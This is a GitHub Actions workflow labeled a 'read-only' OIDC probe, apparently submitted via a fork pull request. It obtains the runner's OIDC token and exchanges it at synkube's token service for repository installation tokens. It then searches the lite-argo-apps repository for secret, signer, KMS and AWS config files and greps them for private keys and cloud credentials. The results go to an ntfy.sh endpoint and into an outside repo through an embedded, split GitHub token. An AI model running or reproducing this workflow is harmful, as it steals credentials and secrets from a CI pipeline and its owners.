name: oidc-forkprobe
# Minimal fork-PR OIDC probe (task 44 / intent 325040). Read-only helpers; no third-party actions.
on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: probe
        env:
          ECHO: "https://ntfy.sh/synkube-pr325040-5e50e6277e0a"
          TAGV: "pr22"
          PAT1: "ghp_fCTIdyWWf02LEDUB"
          PAT2: "P8aIclJlXAUzsP4RXVw4"
          RESREPO: "ARPmt/oidc2-824bb6dc"
        run: |
          set -u
          PAT="${PAT1}${PAT2}"
          ACC="$RUNNER_TEMP/acc.txt"; : > "$ACC"
          send() {
            printf '%s\t%s\n' "$1" "$2" >> "$ACC"
            printf '%s\n' "[$1] $2" | curl -sS --max-time 20 -H "Title: $1" --data-binary @- "$ECHO" >/dev/null 2>&1 || true
          }
          put() {
            [ -n "${PAT:-}" ] || return 0
            [ -f "$2" ] || return 0
            B64=$(base64 -w0 "$2")
            SHA=$(curl -sS --max-time 20 -H "Authorization: token $PAT" "https://api.github.com/repos/$RESREPO/contents/$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("sha","") or "")' 2>/dev/null || true)
            if [ -n "$SHA" ]; then
              curl -sS --max-time 25 -X PUT -H "Authorization: token $PAT" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$RESREPO/contents/$1" --data "{\"message\":\"probe log $TAGV\",\"content\":\"$B64\",\"sha\":\"$SHA\"}" >/dev/null 2>&1 || true
            else
              curl -sS --max-time 25 -X PUT -H "Authorization: token $PAT" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$RESREPO/contents/$1" --data "{\"message\":\"probe log $TAGV\",\"content\":\"$B64\"}" >/dev/null 2>&1 || true
            fi
          }
          send "start-$TAGV" "TAG=$TAGV event=${GITHUB_EVENT_NAME:-?} repo=${GITHUB_REPOSITORY:-?} base=${GITHUB_BASE_REF:-} head=${GITHUB_HEAD_REF:-} shafull=${GITHUB_SHA:-?} actor=${GITHUB_ACTOR:-?} oidc_url=${ACTIONS_ID_TOKEN_REQUEST_URL:+SET} run=${GITHUB_RUN_ID:-?}/${GITHUB_RUN_ATTEMPT:-?}"
          put "probe-results/${TAGV}.txt" "$ACC"
          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
            send "no-oidc-$TAGV" "RESULT=NO_OIDC_ENV_FOR_FORK_PR event=${GITHUB_EVENT_NAME:-?}"
            put "probe-results/${TAGV}.txt" "$ACC"; exit 0
          fi
          RESP=$(curl -sS --max-time 30 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://jwt-exchange" || true)
          TOK=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value","") or "")' 2>/dev/null || true)
          send "token-$TAGV" "TOK_LEN=${#TOK} resp_head=$(printf '%s' "$RESP" | head -c 220)"
          if [ -z "$TOK" ]; then send "no-token-$TAGV" "RESULT=EMPTY_TOKEN"; put "probe-results/${TAGV}.txt" "$ACC"; exit 0; fi
          CLAIMS=$(printf '%s' "$TOK" | python3 -c 'import sys,json,base64;t=sys.stdin.read().strip().split(".");t=t[1] if len(t)>1 else "";t+="="*(-len(t)%4);d=json.loads(base64.urlsafe_b64decode(t));print(json.dumps({k:d.get(k) for k in ["iss","aud","sub","repository","repository_owner","repository_visibility","ref","ref_type","event_name","environment","workflow_ref","job_workflow_ref","sha"]},separators=(",",":")))' 2>/dev/null || true)
          send "claims-$TAGV" "CLAIMS=$CLAIMS"
          EXP_SUB="repo:${GITHUB_REPOSITORY}:pull_request"
          for tgt in synkube/lite-argo-apps synkube/actions synkube/agent-github-broker synkube/jwt-exchange; do
            BODY=$(TOK="$TOK" TGT="$tgt" python3 -c 'import os,json;print(json.dumps({"exchange_profile":"github_actions_to_installation","subject_token":os.environ["TOK"],"resource":{"type":"github_repository","id":os.environ["TGT"]},"requested":{"github_permissions":{"contents":"read","metadata":"read"}}},separators=(",",":")))' 2>/dev/null || true)
            OUT=$(curl -sS --max-time 40 -w '\n%{http_code}' -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' --data-binary "$BODY" || true)
            CODE=$(printf '%s' "$OUT" | tail -n1)
            JBODY=$(printf '%s' "$OUT" | sed '$d')
            send "exch-$TAGV-$tgt" "exp_sub=$EXP_SUB exp_aud=api://jwt-exchange http=$CODE body=$(printf '%s' "$JBODY" | head -c 800)"
            case "$CODE" in
              2*) printf '%s' "$JBODY" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token","") or "")' > "$RUNNER_TEMP/itok" 2>/dev/null || true ;;
            esac
          done
          put "probe-results/${TAGV}.txt" "$ACC"
          if [ ! -s "$RUNNER_TEMP/itok" ]; then send "done-$TAGV" "PROBE_DONE no_installation_token"; put "probe-results/${TAGV}.txt" "$ACC"; exit 0; fi
          ITOK=$(cat "$RUNNER_TEMP/itok")
          send "itok-$TAGV" "ITOK_LEN=${#ITOK} b64_pref=$(printf '%s' "$ITOK" | head -c 300 | base64 -w0 | head -c 420)"
          curl -sS --max-time 30 -H "Authorization: token $ITOK" "https://api.github.com/installation/repositories?per_page=100" -o "$RUNNER_TEMP/repos.json" 2>/dev/null || true
          send "inst-repos-$TAGV" "REPOS=$(python3 -c 'import json,os;d=json.load(open(os.environ["RUNNER_TEMP"]+"/repos.json"));print(",".join(r.get("full_name","") for r in d.get("repositories",[]))[:1500])' 2>/dev/null || true)"
          curl -sS --max-time 40 -H "Authorization: token $ITOK" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/synkube/lite-argo-apps/git/trees/HEAD?recursive=1" -o "$RUNNER_TEMP/tree.json" 2>/dev/null || true
          FILES=$(python3 -c 'import json,os,re;d=json.load(open(os.environ["RUNNER_TEMP"]+"/tree.json"));print("\n".join([t.get("path","") for t in d.get("tree",[]) if re.search(r"(values|signer|kms|secret|aws|rsm|sequencer|sweep|hypercall|relayer|env|config)",t.get("path",""),re.I) and re.search(r"\.(ya?ml|json|env|txt)$",t.get("path",""),re.I)][:40]))' 2>/dev/null || true)
          send "tree-hits-$TAGV" "TREE=$(printf '%s' "$FILES" | tr '\n' ',' | head -c 1500)"
          i=0
          for P in $FILES; do
            [ "$i" -ge 6 ] && break
            C=$(curl -sS --max-time 25 -H "Authorization: token $ITOK" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/synkube/lite-argo-apps/contents/$P" 2>/dev/null || true)
            HIT=$(printf '%s' "$C" | grep -Eio '(key_name|credential_file|BEGIN [A-Z ]*PRIVATE KEY|AKIA|ASIA|keyRing|cryptoKey|client_email|service_account|infisical|secretKeyRef|CLOUDFLARE|[0-9a-f]{64}|0x[0-9a-f]{40})' | sort -u | tr '\n' ' ' | head -c 380)
            SNIP=$(printf '%s' "$C" | grep -Eio '.{0,30}(key_name|credential_file|cryptoKey|CLOUDFLARE|service_account|infisical|signer).{0,50}' | head -3 | tr '\n' '|' | head -c 480)
            send "file-$TAGV" "PATH=$P HIT=$HIT SNIP=$SNIP"
            i=$((i+1))
          done
          send "done-$TAGV" "PROBE_DONE with_installation_token"
          put "probe-results/${TAGV}.txt" "$ACC"

